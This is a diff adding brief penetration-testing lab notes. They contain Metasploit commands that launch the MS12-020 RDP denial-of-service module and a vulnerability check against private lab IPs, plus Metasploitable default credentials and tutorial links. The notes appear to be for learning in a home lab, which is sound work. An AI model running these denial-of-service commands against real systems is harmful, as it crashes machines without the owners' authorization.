@@ -1,0 +1,24 @@
+https://www.hackingarticles.in/remote-desktop-penetration-testing-port-3389/
+[win blue screen error]  -matasploitable
+username-msfadmin  [ default ]
+password-msfadmin  [ default ]
+msfconsole
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+set rhosts 192.168.44.130
+exploit
+--------------------------------------------------------
+https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.md
+msfconsole
+use auxiliary/scanner/rdp/ms12_020_check
+set rhosts 192.168.1.21
+exploit
+-------------------------------------------------------
+https://github.com/rapid7/metasploit-framework/issues/12692
+
+msfconsole
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+set rhosts 192.168.44.129
+exploit
+-----------------------------------------------------
+https://www.offsec.com/metasploit-unleashed/scanner-http-auxiliary-modules/
+----------------------------------------------------
